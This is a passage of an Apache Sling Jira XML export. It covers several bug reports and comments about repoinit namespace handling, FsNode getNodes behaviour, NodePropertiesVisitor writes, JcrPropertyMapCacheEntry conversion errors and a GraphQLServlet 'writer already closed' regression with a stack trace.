                            <comment id="17570778" author="sc0rpic0m" created="Mon, 25 Jul 2022 08:42:24 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=cziegeler&quot; class=&quot;user-hover&quot; rel=&quot;cziegeler&quot;&gt;cziegeler&lt;/a&gt; what do you think? I talked to &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=davidb&quot; class=&quot;user-hover&quot; rel=&quot;davidb&quot;&gt;davidb&lt;/a&gt; about this.&#160;&lt;/p&gt;

&lt;p&gt;Some options from our end:&lt;/p&gt;

&lt;p&gt;&lt;b&gt;1: Instead of removing the repoinit extension in the SDK feature, we could just leave the register namespace statements.&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;Upside: CPConverter doesn&apos;t need to be touched&lt;/p&gt;

&lt;p&gt;Downside: Can create confusion in the SDK feature. Why only register namespace statements? Could provide a wrongful impression that this is the complete repoinit.&#160;&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;&lt;b&gt;2: We could pass an argument to the cpconverter that would allow you to choose with extension it uses to load in a repoinit statement, to extract namespaces with.&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;Upside: We can write a new extension, that is more clear: An extension that is for a specific purpose.&lt;/p&gt;

&lt;p&gt;Downside: Another option for the CPConverter - it&apos;s already a beast.&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;What do you think? Any other possibilities from your end?&lt;/p&gt;</comment>
                            <comment id="17571305" author="sc0rpic0m" created="Tue, 26 Jul 2022 09:25:05 +0000"  >&lt;p&gt;Discussed internally, we will reuse the existing &quot;repoinit&quot; extension instead.&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="10020">
                    <name>Cloners</name>
                                            <outwardlinks description="is a clone of">
                                        <issuelink>
            <issuekey id="13422495">SLING-11060</issuekey>
        </issuelink>
                            </outwardlinks>
                                                                <inwardlinks description="is cloned by">
                                        <issuelink>
            <issuekey id="13473513">SLING-11497</issuekey>
        </issuelink>
            <issuelink>
            <issuekey id="13472892">SLING-11491</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 13 weeks, 2 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z172u0:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11487] getNodes method inconsistent with behavior of getNode when using FsNodes to load content resources</title>
                <link>https://issues.apache.org/jira/browse/SLING-11487</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Unsure if this is the right place to log this issue, please advise if its not the case.&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;Was using WCM IO &amp;amp; Sling Mocks to load Vault FS content. In the process faced multiple issues like not being able to use Modifiable Map on Assets etc. So thought of doing a workaround of loading Vault FS content then convert to json and reload as there is no issue with json content in the end. In this process found that the FsNode object that gets associated with content file only retrieves jcr content node but not the other children looking for the child entries just from content file. However if you use the getNode method instead of getNodes and pass the name pattern, it does retrieve the other folders or nodes present. This behavior seems to be inconsistent considering the typical behavior of jcr. Appreciate if you can guide us on this.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13472787">SLING-11487</key>
            <summary>getNodes method inconsistent with behavior of getNode when using FsNodes to load content resources</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="1" iconUrl="https://issues.apache.org/jira/images/icons/statuses/open.png" description="The issue is open and ready for the assignee to start work on it.">Open</status>
                    <statusCategory id="2" key="new" colorName="blue-gray"/>
                                    <resolution id="-1">Unresolved</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="friendlymahi">Mahidhar Chaluvadi</reporter>
                        <labels>
                    </labels>
                <created>Thu, 21 Jul 2022 22:30:39 +0000</created>
                <updated>Thu, 21 Jul 2022 22:30:39 +0000</updated>
                                                                                <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                        <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 13 weeks, 6 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z172i0:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11483] NodePropertiesVisitor causing session writes on set properties without changed properties</title>
                <link>https://issues.apache.org/jira/browse/SLING-11483</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Executing Repoinit twice without contradicting statements should cause no writes, so the session returned by the visitors should return false for session.hasPendingChanges()&lt;br/&gt;
The way the NodePropertiesVisitor is implemented the properties are always written if this is no defaults statement. While this satisfies the contract that for &quot;default&quot; there should be no writes in case properties are already present it does  even cause a write in case there are no changes what so ever. The behavior of JCR is that in case the same properties are written this is equivalent to a touch (and would likely update the last modified field, although not verified) Adding a comparison for the set scenario to avoid writting properties if the target state already matches the definition eliminates the false change indicator.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13472670">SLING-11483</key>
            <summary>NodePropertiesVisitor causing session writes on set properties without changed properties</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="jsedding">Julian Sedding</assignee>
                                    <reporter username="dsuess">Dominik S&#252;&#223;</reporter>
                        <labels>
                    </labels>
                <created>Thu, 21 Jul 2022 11:26:13 +0000</created>
                <updated>Fri, 23 Sep 2022 20:51:04 +0000</updated>
                            <resolved>Mon, 19 Sep 2022 23:40:51 +0000</resolved>
                                    <version>Repoinit JCR 1.1.40</version>
                                    <fixVersion>Repoinit JCR 1.1.42</fixVersion>
                                    <component>Repoinit</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>3</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="1800">0.5h</timespent>
                                <comments>
                            <comment id="17573643" author="jsedding" created="Mon, 1 Aug 2022 08:53:27 +0000"  >&lt;p&gt;Fixed with &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-jcr-repoinit/pull/35&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;PR #35&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;cc &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=dsuess&quot; class=&quot;user-hover&quot; rel=&quot;dsuess&quot;&gt;dsuess&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17603265" author="enorman" created="Mon, 12 Sep 2022 21:55:54 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=dsuess&quot; class=&quot;user-hover&quot; rel=&quot;dsuess&quot;&gt;dsuess&lt;/a&gt;&#160; Is there anything left to do with this one?&#160; I see a PR related to this was merged so can this be marked as resolved?&lt;/p&gt;</comment>
                            <comment id="17606796" author="enorman" created="Mon, 19 Sep 2022 23:40:51 +0000"  >&lt;p&gt;No feedback was received, so I&apos;m marking this one as fixed.&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 5 weeks, 2 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z171s0:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11466] JcrPropertyMapCacheEntry: ValueFormatException when converting value InputStream to number-array</title>
                <link>https://issues.apache.org/jira/browse/SLING-11466</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;this is related to &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-11465&quot; title=&quot;NPE in JcrPropertyMapCacheEntry when converting from InputStream value to Number&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-11465&quot;&gt;&lt;del&gt;SLING-11465&lt;/del&gt;&lt;/a&gt;:&lt;/p&gt;

&lt;p&gt;when creating a &lt;tt&gt;JcrPropertyMapCacheEntry&lt;/tt&gt; from a single-valued Binary Property and convert it to a number-array, the conversion will fail with &lt;tt&gt;ValueFormatException&lt;/tt&gt;.&lt;/p&gt;

&lt;p&gt;the reason is &lt;tt&gt;convertToArray&lt;/tt&gt; is called with an array constructed from the singular property value. looping over the array will call &lt;tt&gt;convertToType&lt;/tt&gt; with an index != -1 which results in &lt;tt&gt;Long.valueOf(this.property.getLengths()&lt;span class=&quot;error&quot;&gt;&amp;#91;index&amp;#93;&lt;/span&gt;)&lt;/tt&gt;. however, for a single-valued property &lt;tt&gt;getLengths&lt;/tt&gt; fails with &lt;tt&gt;ValueFormatException&lt;/tt&gt; -&amp;gt; consequently null is returned instead of the length of the property.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=cziegeler&quot; class=&quot;user-hover&quot; rel=&quot;cziegeler&quot;&gt;cziegeler&lt;/a&gt; fyi&lt;/p&gt;</description>
                <environment></environment>
        <key id="13472270">SLING-11466</key>
            <summary>JcrPropertyMapCacheEntry: ValueFormatException when converting value InputStream to number-array</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="angela">Angela Schreiber</assignee>
                                    <reporter username="angela">Angela Schreiber</reporter>
                        <labels>
                    </labels>
                <created>Tue, 19 Jul 2022 12:46:56 +0000</created>
                <updated>Wed, 28 Sep 2022 09:42:28 +0000</updated>
                            <resolved>Tue, 19 Jul 2022 15:27:46 +0000</resolved>
                                                    <fixVersion>JCR Resource 3.2.2</fixVersion>
                                    <component>JCR</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>0</watches>
                                                                                                                    <issuelinks>
                            <issuelinktype id="10032">
                    <name>Blocker</name>
                                            <outwardlinks description="blocks">
                                        <issuelink>
            <issuekey id="13472304">SLING-11468</issuekey>
        </issuelink>
                            </outwardlinks>
                                                        </issuelinktype>
                            <issuelinktype id="10030">
                    <name>Reference</name>
                                            <outwardlinks description="relates to">
                                        <issuelink>
            <issuekey id="13472269">SLING-11465</issuekey>
        </issuelink>
                            </outwardlinks>
                                                        </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 14 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z16zb4:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11465] NPE in JcrPropertyMapCacheEntry when converting from InputStream value to Number</title>
                <link>https://issues.apache.org/jira/browse/SLING-11465</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;while working on &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-11461&quot; title=&quot;Reduce complexity&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-11461&quot;&gt;&lt;del&gt;SLING-11461&lt;/del&gt;&lt;/a&gt; trying to reduce complexity in &lt;tt&gt;JcrPropertyMapCacheEntry&lt;/tt&gt;. i spotted that this class is prone to multiple NPEs.&lt;/p&gt;

&lt;p&gt;in case of value being of type &lt;tt&gt;InputStream&lt;/tt&gt; conversion to a number will try to retrieve the length of the &lt;tt&gt;property&lt;/tt&gt; fields, which however is null if &lt;tt&gt;JcrPropertyMapCacheEntry&lt;/tt&gt; has been created with a value and a node.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=cziegeler&quot; class=&quot;user-hover&quot; rel=&quot;cziegeler&quot;&gt;cziegeler&lt;/a&gt; fyi&lt;/p&gt;
</description>
                <environment></environment>
        <key id="13472269">SLING-11465</key>
            <summary>NPE in JcrPropertyMapCacheEntry when converting from InputStream value to Number</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="angela">Angela Schreiber</assignee>
                                    <reporter username="angela">Angela Schreiber</reporter>
                        <labels>
                    </labels>
                <created>Tue, 19 Jul 2022 12:40:33 +0000</created>
                <updated>Wed, 28 Sep 2022 09:42:25 +0000</updated>
                            <resolved>Tue, 19 Jul 2022 15:28:01 +0000</resolved>
                                                    <fixVersion>JCR Resource 3.2.2</fixVersion>
                                    <component>JCR</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>0</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="2400">40m</timespent>
                                    <issuelinks>
                            <issuelinktype id="10032">
                    <name>Blocker</name>
                                            <outwardlinks description="blocks">
                                        <issuelink>
            <issuekey id="13472304">SLING-11468</issuekey>
        </issuelink>
                            </outwardlinks>
                                                        </issuelinktype>
                            <issuelinktype id="10030">
                    <name>Reference</name>
                                                                <inwardlinks description="is related to">
                                        <issuelink>
            <issuekey id="13472270">SLING-11466</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 14 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z16zaw:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11458] Regress - &quot;Writer has already been closed&quot; exception in GraphQLServlet</title>
                <link>https://issues.apache.org/jira/browse/SLING-11458</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;The GraphQLServlet shouldn&apos;t call &lt;tt&gt;response.getWriter().flush()&lt;/tt&gt; as the &lt;tt&gt;JsonWriter&lt;/tt&gt; used by the &lt;tt&gt;JsonSerializer&lt;/tt&gt; implements &lt;tt&gt;Closeable&lt;/tt&gt; and as such &lt;a href=&quot;https://github.com/jdereg/json-io/blob/cf849f15460decf10a8a320390de11965bb5996b/src/main/java/com/cedarsoftware/util/io/JsonWriter.java#L2413&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;closes the Writer&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;This causes a &quot;Writer has already been closed&quot; Exception when &lt;tt&gt;flush()&lt;/tt&gt; is called.&lt;/p&gt;

&lt;p&gt;This was fixed in commit d27f4bb7 but then this commit: 11c7e389 did undo the fix as now the JsonWriter is closed when existing the try-catch block.&lt;/p&gt;

&lt;p&gt;I will undo it and prevent the premature closure as this is causing issues like when the call to this servlet is made through a dispatcher.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13471847">SLING-11458</key>
            <summary>Regress - &quot;Writer has already been closed&quot; exception in GraphQLServlet</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="8">Not A Problem</resolution>
                                        <assignee username="andysch">Andreas Schaefer</assignee>
                                    <reporter username="etugarev">Evgeny Tugarev</reporter>
                        <labels>
                    </labels>
                <created>Fri, 15 Jul 2022 21:15:30 +0000</created>
                <updated>Wed, 20 Aug 2025 14:32:03 +0000</updated>
                            <resolved>Tue, 15 Aug 2023 12:48:31 +0000</resolved>
                                    <version>GraphQL Core 0.0.4</version>
                                                    <component>GraphQL</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                                                                                <comments>
                            <comment id="17567402" author="schaefa" created="Fri, 15 Jul 2022 21:41:54 +0000"  >&lt;p&gt;I encountered that issue in AEM when using the AEM GraphiQL UI:&lt;br/&gt;
&#160;&lt;br/&gt;
15.07.2022 13:36:29.907 &lt;b&gt;ERROR&lt;/b&gt; [127.0.0.1 &lt;span class=&quot;error&quot;&gt;&amp;#91;1657917208499&amp;#93;&lt;/span&gt; POST /content/cq:graphql/as-conf-1/endpoint.json HTTP/1.1] org.apache.sling.engine.impl.SlingRequestProcessorImpl Writer has already been closed.&lt;br/&gt;
org.apache.sling.engine.impl.SlingHttpServletResponseImpl$WriterAlreadyClosedException: null&lt;br/&gt;
at org.apache.sling.engine.impl.SlingHttpServletResponseImpl$1.checkClosed(SlingHttpServletResponseImpl.java:191) &lt;span class=&quot;error&quot;&gt;&amp;#91;org.apache.sling.engine:2.9.0&amp;#93;&lt;/span&gt;&lt;br/&gt;
at org.apache.sling.engine.impl.SlingHttpServletResponseImpl$1.flush(SlingHttpServletResponseImpl.java:228) &lt;span class=&quot;error&quot;&gt;&amp;#91;org.apache.sling.engine:2.9.0&amp;#93;&lt;/span&gt;&lt;br/&gt;
at org.apache.sling.rewriter.impl.RewriterResponse.flushBuffer(RewriterResponse.java:126) &lt;span class=&quot;error&quot;&gt;&amp;#91;org.apache.sling.rewriter:1.3.2&amp;#93;&lt;/span&gt;&lt;br/&gt;
at org.apache.sling.engine.impl.request.SlingRequestDispatcher.forward(SlingRequestDispatcher.java:151) &lt;span class=&quot;error&quot;&gt;&amp;#91;org.apache.sling.engine:2.9.0&amp;#93;&lt;/span&gt;&lt;br/&gt;
at com.day.cq.wcm.core.impl.WCMComponentFilter$ForwardRequestDispatcher.forward(WCMComponentFilter.java:503) &lt;span class=&quot;error&quot;&gt;&amp;#91;com.day.cq.wcm.cq-wcm-core:5.14.46&amp;#93;&lt;/span&gt;&lt;br/&gt;
